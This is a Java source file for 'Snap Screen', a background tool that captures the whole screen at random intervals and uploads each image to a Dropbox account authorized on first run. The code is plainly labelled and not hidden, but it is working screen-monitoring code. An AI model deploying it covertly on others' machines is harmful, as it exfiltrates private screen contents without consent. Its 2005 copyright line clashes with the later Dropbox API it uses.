package com.snapscreenapp;
/**
 * Snap Screen
 * Runs in the background capturing screenshots and random intervals and sends them to predetermined recipient
 Copyright (C) 2005 Isaac Serafino <isaac.serafino@serafinosoftware.com>

 This library is free software; you can redistribute it and/or
 modify it under the terms of the GNU Lesser General Public
 License as published by the Free Software Foundation; either
 version 2.1 of the License, or (at your option) any later version.

 This library is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 Lesser General Public License for more details.

 You should have received a copy of the GNU Lesser General Public
 License along with this library; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import java.util.Random;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

import com.dropbox.core.DbxAppInfo;
import com.dropbox.core.DbxAuthFinish;
import com.dropbox.core.DbxAuthInfo;
import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.DbxWebAuth;
import com.dropbox.core.json.JsonReadException;
import com.dropbox.core.json.JsonReader.FileLoadException;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.UploadErrorException;
import com.dropbox.core.v2.files.WriteMode;

public class SnapScreen {
	public static void main(String[] args) throws FileLoadException, IOException {
		File file = new File("authorization.json");
		if (!file.exists()) {
			authorize();
		}

		DbxAuthInfo authorization = DbxAuthInfo.Reader.readFromFile(file);

		String password = authorization.getAccessToken();

		SnapScreen snapScreen = new SnapScreen(password);
		snapScreen.start();
	}

	private static void authorize() throws IOException {
		// Read app info file (contains app key and app secret)
		DbxAppInfo appInfo;
		try {
			InputStream stream = SnapScreen.class.getResourceAsStream("snap_screen.app");
			appInfo = DbxAppInfo.Reader.readFully(stream);
		} catch (JsonReadException ex) {
			System.err.println("Error reading <app-info-file>: " + ex.getMessage());
			System.exit(1);
			return;
		}

		// Run through Dropbox API authorization process
		DbxRequestConfig requestConfig = new DbxRequestConfig("SnapScreen/0.1");
		DbxWebAuth webAuth = new DbxWebAuth(requestConfig, appInfo);
		DbxWebAuth.Request webAuthRequest = DbxWebAuth.newRequestBuilder().withNoRedirect().build();

		String authorizeUrl = webAuth.authorize(webAuthRequest);
		String code = (String) JOptionPane.showInputDialog(null,
				"Follow these steps to authorize where Snap Screen will send screenshots.\n"
						+ "You should only have to do this the first time.\n"
						+ "1. Go to the Internet address in the box below.\n"
						+ "2. Click \"Allow\" (you might have to log in first).\n" + "3. Copy the authorization code.\n"
						+ "Enter the authorization code here, in place of the Internet address: ",
				"Authorize Snap Screen", JOptionPane.QUESTION_MESSAGE, null, null, authorizeUrl);

		if (code == null) {
			System.exit(1);
			return;
		}
		code = code.trim();

		DbxAuthFinish authFinish;
		try {
			authFinish = webAuth.finishFromCode(code);
		} catch (DbxException ex) {
			System.err.println("Error in DbxWebAuth.authorize: " + ex.getMessage());
			System.exit(1);
			return;
		}

		System.out.println("Authorization complete.");
		System.out.println("- User ID: " + authFinish.getUserId());

		// Save auth information to output file.
		DbxAuthInfo authInfo = new DbxAuthInfo(authFinish.getAccessToken(), appInfo.getHost());
		String argAuthFileOutput = "authorization.json";
		File output = new File(argAuthFileOutput);
		try {
			DbxAuthInfo.Writer.writeToFile(authInfo, output);
			System.out.println("Saved authorization information to \"" + output.getCanonicalPath() + "\".");
		} catch (IOException ex) {
			System.err.println("Error saving to <auth-file-out>: " + ex.getMessage());
			System.err.println("Dumping to stderr instead:");
			DbxAuthInfo.Writer.writeToStream(authInfo, System.err);
			System.exit(1);
			return;
		}
	}

	private DbxClientV2 dropbox;
	private String password;
	private Random random;
	private Rectangle rectangle;
	private Robot robot;

	public SnapScreen(String password) {
		this.password = password;
	}

	private BufferedImage captureScreenshot() throws AWTException {
		if (robot == null) {
			robot = new Robot();
		}

		if (rectangle == null) {
			Toolkit toolkit;
			toolkit = Toolkit.getDefaultToolkit();

			Dimension screenSize = toolkit.getScreenSize();
			rectangle = new java.awt.Rectangle(screenSize);
		}

		// Capture the whole screen
		return robot.createScreenCapture(rectangle);
	}

	private long generateInterval() {
		if (random == null) {
			random = new Random();
		}

		// A number of milliseconds from 1 second to 10 minutes
		return random.nextInt(599001) + 1000;
	}

	private void sendScreenshotMessage(BufferedImage screenshot, long interval) throws IOException {
		ByteArrayOutputStream os = new ByteArrayOutputStream();
		ImageIO.write(screenshot, "jpeg", os);
		InputStream is = new ByteArrayInputStream(os.toByteArray());

		if (dropbox == null) {
			DbxRequestConfig requestConfig = new DbxRequestConfig("SnapScreen/0.1");
			dropbox = new DbxClientV2(requestConfig, password);
		}

		uploadFile(dropbox, is, "/next_" + interval + ".jpg");
	}

	/**
	 * Uploads a file in a single request. This approach is preferred for small
	 * files since it eliminates unnecessary round-trips to the servers.
	 *
	 * @param dbxClient
	 *            Dropbox user authenticated client
	 * @param in
	 *            Input stream to upload
	 * @param dropboxPath
	 *            Where to upload the file to within Dropbox
	 */
	private static void uploadFile(DbxClientV2 dbxClient, InputStream in, String dropboxPath) {
		try {
			FileMetadata metadata = dbxClient.files().uploadBuilder(dropboxPath).withMode(WriteMode.ADD)
					.withClientModified(new Date()).uploadAndFinish(in);

			System.out.println(metadata.toStringMultiline());
		} catch (UploadErrorException ex) {
			System.err.println("Error uploading to Dropbox: " + ex.getMessage());
			System.exit(1);
		} catch (DbxException ex) {
			System.err.println("Error uploading to Dropbox: " + ex.getMessage());
			System.exit(1);
		} catch (IOException ex) {
			System.err.println("Error reading from stream \"" + in + "\": " + ex.getMessage());
			System.exit(1);
		}
	}

	private void start() {
		BufferedImage screenshot;
		long interval;

		while (true) {
			try {
				screenshot = captureScreenshot();
			} catch (AWTException e1) {
				e1.printStackTrace();
				break;
			}

			interval = generateInterval();

			try {
				sendScreenshotMessage(screenshot, interval);
			} catch (IOException e1) {
				e1.printStackTrace();
				break;
			}

			try {
				Thread.sleep(interval);
			} catch (InterruptedException e) {
				break;
			}
		}
	}
}